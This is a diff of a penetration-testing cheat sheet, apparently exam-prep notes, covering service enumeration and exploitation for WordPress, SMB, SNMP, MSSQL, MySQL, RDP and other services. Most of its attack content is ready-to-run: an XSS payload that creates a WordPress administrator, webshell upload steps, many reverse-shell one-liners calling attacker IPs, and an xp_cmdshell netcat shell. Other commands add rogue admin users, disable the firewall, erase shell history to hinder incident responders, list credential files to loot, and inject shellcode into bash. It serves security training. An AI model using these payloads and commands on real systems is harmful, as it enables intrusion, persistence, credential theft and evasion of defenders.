+	return [...minified_js].map(function (c) { return c.codePointAt(0); }).join(",")
+}
+let encoded = encode_javascript("insert_minified_javascript") // replace with your payload
+console.log(encoded)
+```
+
+Once the payload is encoded, insert the resulting array of integers into the following injected XSS script tag:
+
+```html
+<!-- replace digits with output from previous encoder -->
+<script>eval(String.fromCodePoint(97,108,101,114,116,40,39,128526,39,41))</script>
+<!-- example is code for "alert('😎')" -->
+```
+
+
+
+Here is an example script payload that creates an admin user on a vulnerable WordPress site by exploiting the vulnerable User-Agent header:
+
+```javascript
+// Collect WordPress nonce from admin user
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+// Create new admin account
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=derp&email=derp@derp.com&pass1=herpaderp&pass2=herpaderp&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+
+
+### 4.5.6. WordPress
 
 ```sh
 wpscan --update --url http://$VICTIM_IP/
@@ -720,11 +1008,15 @@ wpscan --update \
 cmsmap -o cmsmap.txt -d http://$VICTIM_IP
 ```
 
-Also try logging into the Wordpress admin page.
+Also try logging into the Wordpress admin page (`/wp-admin`).
 
 If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.
 
-After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. (uploaded file will be found under Media tab)
+After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.
+
+[WordPress Plugin Webshell](https://github.com/p0dalirius/Wordpress-webshell-plugin) - accessible via `/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id`
+
+Maybe upload Media file that has PHP script?
 
 Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).
 
@@ -735,7 +1027,24 @@ mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select conc
 
 Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.
 
-## 4.5. 88/749 Kerberos
+
+### 4.5.7. Drupal
+
+```sh
+droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
+```
+
+
+
+### 4.5.8. Joomla
+
+```sh
+joomscan --ec -u $VICTIM_IP # if joomla found
+```
+
+
+
+## 4.6. 88/749 Kerberos
 
 ```sh
 # username enumeration with Kerbrute
@@ -761,7 +1070,7 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
 ```
 
-## 4.6. 110,995 - POP
+## 4.7. 110,995 - POP
 
 Post Office Protocol (POP) retrieves email from a remote mail server.
 
@@ -787,7 +1096,7 @@ RETR 1 # retrieve first email
 # try real (root) and fake users to see if there is a difference in error msgs
 ```
 
-## 4.7. 111 - RPCbind
+## 4.8. 111 - RPCbind
 
 Gets you list of ports open using RPC services. Can be used to locate NFS
 or rusersd services to pentest next.
@@ -800,9 +1109,15 @@ nc -nv $VICTIM_IP 111
 rpcinfo -s $VICTIM_IP
 # list ports of rpc services
 rpcinfo -p $VICTIM_IP
+
+# try connecting with null session
+rpcclient -U "" $VICTIM_IP
+rpcclient $> enumdomusers
+rpcclient $> queryuser 0xrid_ID
+# see MSRPC (port 135) for more commands
 ```
 
-## 4.8. 119 - NNTP
+## 4.9. 119 - NNTP
 
 Network News Transfer Protocol, allows clients to retrieve (read) and post
 (write) news articles to the NNTP (Usenet) server.
@@ -821,7 +1136,7 @@ QUIT
 # https://tools.ietf.org/html/rfc977
 ```
 
-## 4.9. 135 - MSRPC
+## 4.10. 135 - MSRPC
 
 ```sh
 # see the services available through MSRPC
@@ -883,9 +1198,9 @@ More SIDs
 impacket-samrdump -port 139 $VICTIM_IP
 ```
 
-## 4.10. 139,445 - SMB
+## 4.11. 139,445 - SMB
 
-Port 445 is Server Message Block (SMB). Port 139 is NetBIOS, which is tied to SMB in some way.
+Port 445 is Server Message Block (SMB). Port 139 is NetBIOS (legacy: 137, 138), which is tied to SMB for backwards compatibility of session management and name services.
 
 Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups, shares, etc.)
 
@@ -894,8 +1209,9 @@ Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 SMB Scans:
 
 ```sh
-# get netbios name of computer, possibly logged-in user
-nbtscan $VICTIM_IP
+# get netbios names of computers, and usernames
+sudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond
+nbtscan $VICTIM_IP/24
 
 # basic SMB scan, smbmap
 smbmap -H $VICTIM_IP
@@ -918,7 +1234,7 @@ enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
 # may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)
 
 # nmap script scans
-nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
+nmap --script="safe and smb-*" -n -v -p 139,445 $VICTIM_IP
 ```
 
 Listing SMB Shares:
@@ -945,6 +1261,14 @@ smbmap [-u "username" -p "password"] -r [SHARENAME] -H <IP> [-P <PORT>] # Non-Re
 smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash
 ```
 
+Listing SMB Shares from Windows:
+
+```bat
+:: /all lets us see administrative shares (ending in '$').
+:: Can use IP or hostname to specify host.
+net view \\VICTIM /all
+```
+
 Common shares for Windows:
 
 - C$ - maps to C:/
@@ -969,14 +1293,14 @@ client max protocol = SMB3
 
 Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`
 
-### 4.10.1. SMB Bruteforcing
+### 4.11.1. SMB Bruteforcing
 
 ```sh
 nmap --script smb-brute -p 445 $VICTIM_IP
 hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
 ```
 
-### 4.10.2. Interacting with SMB
+### 4.11.2. Interacting with SMB
 
 ```sh
 # tar all files [under a directory (no trailing slash on path)]
@@ -1004,7 +1328,7 @@ mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
 
-## 4.11. 161,162,10161,10162 - SNMP
+## 4.12. 161,162,10161,10162 - SNMP
 
 Simple Network Management Protocol (SNMP).
 
@@ -1036,14 +1360,30 @@ snmp-check $VICTIM_IP
 onesixtyone $VICTIM_IP public
 
 # getting system description (like uname -a on Linux systems)
-snmpget -v2c -c public localhost SNMPv2-MIB::sysDescr.0
+snmpwalk -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr
+snmpget -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr.0
 
-# view installed snmp software on victim
-snmpwalk -v2c -c public $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName | grep -i snmp
+snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
+snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
+snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
+snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
+snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software
 
 # get ALL info available on SNMP
-snmpwalk -v2c -c public $VICTIM_IP .iso
+snmpwalk -v2c -c public $VICTIM_IP
 ```
+
+Useful SNMP OIDs:
+
+| OID Value              | Info Provided    |
+| ---------------------- | ---------------- |
+| 1.3.6.1.2.1.25.1.6.0   | System Processes |
+| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
+| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
+| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
+| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
+| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
+| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |
 
 Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:
 
@@ -1065,7 +1405,9 @@ Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/b
   - snmpd.conf
   - snmp-config.xml
 
-### 4.11.1. Exploring MIBs with [`snmptranslate`](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html)
+### 4.12.1. Exploring MIBs with `snmptranslate`
+
+From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):
 
 ```sh
 # look up numeric OID to get abbreviated name
@@ -1102,7 +1444,15 @@ net-snmp-config --default-mibdirs # only if installed
 snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
 ```
 
-### 4.11.2. RCE with SNMP
+When using the `-m +ALL` argument, I got the error:
+
+```
+Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
+```
+
+There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).
+
+### 4.12.2. RCE with SNMP
 
 See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)
 
@@ -1121,7 +1471,11 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp
 
 This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
 
-## 4.12. 1433 - MSSQL
+## 4.13. 389 - LDAP
+
+TODO
+
+## 4.14. 1433 - MSSQL
 
 Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).
 
@@ -1139,7 +1493,7 @@ nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,
 
 The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)
 
-### 4.12.1. MSSQL Bruteforcing
+### 4.14.1. MSSQL Bruteforcing
 
 ```sh
 # Be carefull with the number of password in the list, this could lock-out accounts
@@ -1152,7 +1506,7 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=user
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
 
-### 4.12.2. MSSQL Interaction
+### 4.14.2. MSSQL Interaction
 
 ```sql
 -- show username
@@ -1180,7 +1534,7 @@ References:
 - [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
 
-### 4.12.3. MSSQL Command Execution
+### 4.14.3. MSSQL Command Execution
 
 Simple command execution:
 
@@ -1235,7 +1589,7 @@ xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
 go
 ```
 
-## 4.13. 2049 - NFS
+## 4.15. 2049 - NFS
 
 [HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
 
@@ -1260,7 +1614,8 @@ showmount -e $VICTIM_IP
 # if mount fails, try without vers=2
 # dir may need "/"prefix
 # dir is one of showmount -e results (from /etc/exports)
-mkdir nfs && sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs
+mkdir nfs && \
+sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs
 
 # create user with specific UID to be able to read files on your kali box
 # "-s" login shell, "-M" no create home
@@ -1276,7 +1631,7 @@ sudo usermod -a -G tempgroup tempuser
 
 See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
 
-## 4.14. 3306 - MySQL Enumeration
+## 4.16. 3306 - MySQL Enumeration
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -1350,7 +1705,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
-### 4.14.1. MySQL UDF Exploit
+### 4.16.1. MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
 ready the UDF library (provides `sys_exec` function) locally on the server.
@@ -1403,7 +1758,7 @@ SELECT sys_exec("net user hacker P@$$w0rd /add");
 SELECT sys_exec("net localgroup Administrators hacker /add");
 ```
 
-### 4.14.2. Grabbing MySQL Passwords
+### 4.16.2. Grabbing MySQL Passwords
 
 ```sh
 # contains plain-text password of the user debian-sys-maint
@@ -1413,7 +1768,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-### 4.14.3. Useful MySQL Files
+### 4.16.3. Useful MySQL Files
 
 - Configuration Files:
   - Windows
@@ -1436,7 +1791,34 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
-## 4.15. 5900 - VNC
+
+## 4.17. 3389 - RDP
+
+Connect to Windows RDP
+
+```sh
+xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
+# to attach a drive, use:
+# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
+```
+
+Add RDP User
+
+```bat
+net user derp herpaderp /add
+net localgroup Administrators derp /add
+net localgroup "Remote Desktop Users" derp /add
+:: enable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+:: delete user
+net user hacker /del
+:: disable remote desktop
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+```
+
+
+
+## 4.18. 5900 - VNC
 
 VNC is a graphical remote desktop sharing system. Other ports involved in it
 are: 5800,5801,5900,5901
@@ -1455,7 +1837,7 @@ ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
 patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 ```
 
-## 4.16. 27017 - MongoDB
+## 4.19. 27017 - MongoDB
 
 MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
 default.
@@ -1506,11 +1888,11 @@ db.users.drop()
 - $lt
 - $and
 - $or
-- $where -
+- $where
 - $exists
 - $regex
 
-### 4.16.1. Exploiting NoSQL Injection
+### 4.19.1. Exploiting NoSQL Injection
 
 In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:
 
@@ -1567,7 +1949,7 @@ username=admin&password[$regex]=pass.*
 ```
 
 
-## 4.17. Amazon Web Services (AWS) S3 Buckets
+## 4.20. Amazon Web Services (AWS) S3 Buckets
 
 Format of the bucket and resource (file) in urls:
 
@@ -1600,12 +1982,12 @@ curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml
 aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
 ```
 
-### 4.17.1. AWS Identity and Access Management (IAM)
+### 4.20.1. AWS Identity and Access Management (IAM)
 
 Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.
 
 
-#### 4.17.1.1. IAM Access Keys
+#### 4.20.1.1. IAM Access Keys
 
 IAM Access Keys consist of an Access Key ID and the Secret Access Key.
 
@@ -1620,7 +2002,7 @@ There is another type of credentials, **short-term credentials**, where the
 Access Key ID **begins with the letters `ASIA`** and includes an additional
 string called the Session Token.
 
-#### 4.17.1.2. Conducting Reconnaissance with IAM
+#### 4.20.1.2. Conducting Reconnaissance with IAM
 
 When you find credentials to AWS, you can add them to your AWS Profile in the
 AWS CLI. For this, you use the command:
@@ -1658,7 +2040,7 @@ A few other common AWS reconnaissance techniques are:
 4. Reveal the encrypted contents of a secret (secrets might be region-specific).
    `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`
 
-#### 4.17.1.3. AWS ARNs
+#### 4.20.1.3. AWS ARNs
 
 An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.
 
@@ -1783,20 +2165,7 @@ zip2john myfile.zip > zipkey.john
 john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-## 5.3. Port Knocking
-
-```sh
-# port knock on ports 24->23->22 with nmap
-# "-r" forces ports to be hit in order
-# may want to add "--max-parallelism 1"
-nmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP
-
-# doing the same thing with netcat
-# NOTE: netcat can only knock on sequential ports without using a for-loop
-nc -z $VICTIM_IP 22-24
-```
-
-## 5.4. Buffer Overflows
+## 5.3. Buffer Overflows
 
 I wrote a great python script for tackling the old-school OSCP BOF boxes.
 Check it out [here](tools/pwn-bof-template.py).
@@ -1839,7 +2208,7 @@ msf-pattern_offset -q EIP_VAL
 !mona jmp -r esp -cpb '\x00\x51'
 ```
 
-## 5.5. Reverse Shells
+## 5.4. Reverse Shells
 
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
@@ -1864,7 +2233,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/
 **Bash Reverse Shell**
 
 ```sh
-# only works on Linux in bash
+# only works on Linux with bash
 /bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'
 ```
 
@@ -1908,7 +2277,7 @@ socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144
 python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 
 # daemonizing shell for *nix hosts
-python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
@@ -1945,7 +2314,7 @@ sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
-### 5.5.1. Covering your tracks
+### 5.4.1. Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
@@ -1963,7 +2332,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
 Remove-Module PSReadline
 ```
 
-### 5.5.2. Running a detached/daeminized process on Linux
+### 5.4.2. Running a detached/daeminized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -1974,44 +2343,6 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
 ```
 
-## 5.6. Encryption
-
-### 5.6.1. Create self-signed SSL/TLS certificate
-
-```sh
-# generate separate .key and .crt files
-openssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt
-
-# simpler method?
-openssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365
-
-# convert .key/.cert to .pem file (easy way)
-cat mycert.crt mycert.key > mycert.pem
-
-# official way to convert combo of .key and .crt to .pem if needed:
-openssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12
-openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem
-
-# create client cert from ca.key
-openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
-openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
-```
-
-### 5.6.2. Decrypting files with GPG
-
-```sh
-# import public and private keys into gpg
-gpg --import secring.gpg pubring.gpg
-
-# list imported pubkeys
-gpg --list-keys
-
-# list imported private keys
-gpg --list-secret-keys
-
-# decrypting file with keys already imported
-gpg -d -o secret.txt secret.txt.gpg
-```
 
 # 6. Windows
 
@@ -2226,7 +2557,10 @@ Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.co
 
 ```bat
 :: must be done from administrator prompt
+:: Disable Windows firewall on newer Windows:
 netsh advfirewall set allprofiles state off
+:: Disable Windows firewall on older Windows:
+netsh firewall set opmode disable
 ```
 
 ### 6.4.3. Turn off Windows Defender
@@ -2957,13 +3291,13 @@ wmic process where name="nc.exe" delete
 ### 6.13.3. Add RDP User
 
 ```bat
-net user hacker P@$$w0rd /add
-net localgroup Administrators hacker /add
-net localgroup "Remote Desktop Users" hacker /ADD
+net user derp herpaderp /add
+net localgroup Administrators derp /add
+net localgroup "Remote Desktop Users" derp /ADD
 :: enable remote desktop
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 :: delete user
-net user hacker /del
+net user derp /del
 :: disable remote desktop
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 ```
@@ -3518,6 +3852,26 @@ sudo chmod u+s /bin/sh
 ```
 
 # 8. Loot
+
+## Sensitive Files
+
+The following are some Linux files that have sensitive information that
+are good to try to grab when you can (directory traversal, LFI, shell access).
+
+```
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/issue
+/etc/motd
+/etc/mysql/my.cnf
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
+```
+
 
 ## 8.1. File Transfers
 
@@ -4077,46 +4431,29 @@ nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 
 # 10. Miscellaneous
 
-## 10.1. Disable SSH Host Key Checking
+## 10.1. Port Knocking
 
-Put this at the top of your `~/.ssh/config` to disable it for all hosts:
+```sh
+# port knock on ports 24->23->22 with nmap
+# "-r" forces ports to be hit in order
+# may want to add "--max-parallelism 1"
+nmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP
 
-```
-Host *
-   StrictHostKeyChecking no
-   UserKnownHostsFile /dev/null
-```
-
-or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
-
-## 10.2. Use Legacy Key Exchange Algorithm or Cipher with SSH
-
-If you try to ssh onto a host and get an error like:
-
-```
-Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+# doing the same thing with netcat
+# NOTE: netcat can only knock on sequential ports without using a for-loop
+nc -z $VICTIM_IP 22-24
 ```
 
-You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.
+If you're able to read files on the victim, check out their `/etc/knockd.conf`
 
-You can also specify the `KexAlgorithms` variable in the ssh-config file.
-
-Similarly, if you get an error like:
-
-```
-Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
-```
-
-You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.
-
-## 10.3. Convert text to Windows UTF-16 format on Linux
+## 10.2. Convert text to Windows UTF-16 format on Linux
 
 ```sh
 # useful for encoding a powershell command in base64
 echo "some text" | iconv -t UTF-16LE
 ```
 
-## 10.4. Extract UDP pcap packet payload data
+## 10.3. Extract UDP pcap packet payload data
 
 Using scapy:
 
@@ -4144,7 +4481,7 @@ tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd
 # xxd: cannot combine '-r -p' like '-rp'
 ```
 
-## 10.5. Execute Shellcode from Bash
+## 10.4. Execute Shellcode from Bash
 
 ```sh
 cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
@@ -4159,3 +4496,55 @@ Explained:
    -  The line reads out the maps file showing the memory map of the bash process, then it greps for `/bin/bash` to find where it is loaded in memory. It gets the address with cut and head then converts it from base16 to decimal. It adds that number to `0x300e0`
    -  `0x300e0` is the location of bash’s exit function in memory
    -  Net result: You overwrite bash’s exit function with the shellcode
+
+## 10.5. Encryption
+
+### 10.5.1. Create self-signed SSL/TLS certificate
+
+```sh
+# generate separate .key and .crt files
+openssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt
+
+# simpler method?
+openssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365
+
+# convert .key/.cert to .pem file (easy way)
+cat mycert.crt mycert.key > mycert.pem
+
+# official way to convert combo of .key and .crt to .pem if needed:
+openssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12
+openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem
+
+# create client cert from ca.key
+openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
+openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
+```
+
+### 10.5.2. Decrypting files with GPG
+
+```sh
+# import public and private keys into gpg
+gpg --import secring.gpg pubring.gpg
+
+# list imported pubkeys
+gpg --list-keys
+
+# list imported private keys
+gpg --list-secret-keys
+
+# decrypting file with keys already imported
+gpg -d -o secret.txt secret.txt.gpg
+```
+
+## 10.6. Validating Checksums
+
+This is how you validate a sha256 checksum for a file:
+
+```sh
+# make checksum check-file.
+# Format is <hexdigest><space><filename>, in same directory as file.
+echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus
+
+# run sha256sum with '-c <check-file>' to have it validate the checksums match
+sha256sum -c sha256sum_nessus
+```
